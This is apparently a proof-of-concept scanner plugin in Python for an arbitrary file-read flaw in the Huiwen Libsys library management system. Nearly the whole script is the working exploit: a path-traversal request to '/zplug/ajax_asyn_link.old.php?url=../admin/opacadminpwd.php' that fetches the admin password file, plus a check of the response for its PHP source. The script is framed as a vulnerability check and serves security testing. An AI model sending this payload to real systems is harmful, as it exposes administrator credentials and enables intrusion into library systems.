#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  : 汇文Libsys图书馆管理系统 /zplug/ajax_asyn_link.old.php 任意文件读取漏洞
Author    : a
mail      : a@lcx.cc
Referer   : http://www.beebeeto.com/pdb/poc-2015-0109/
"""

import urlparse
def assign(service, arg):
     if service == "libsys":
        return True, arg


def audit(arg):
    payload = '/zplug/ajax_asyn_link.old.php?url=../admin/opacadminpwd.php'
    url = arg + payload
    code, head, res, errcode, _ = curl.curl('"%s"' % url)
    if code == 200 and 'strPassWdView' in res and '<?php' in res:
        security_hole(url)
        

if __name__ == '__main__':
    from dummy import *
    audit(assign('libsys', 'http://test.com/')[1])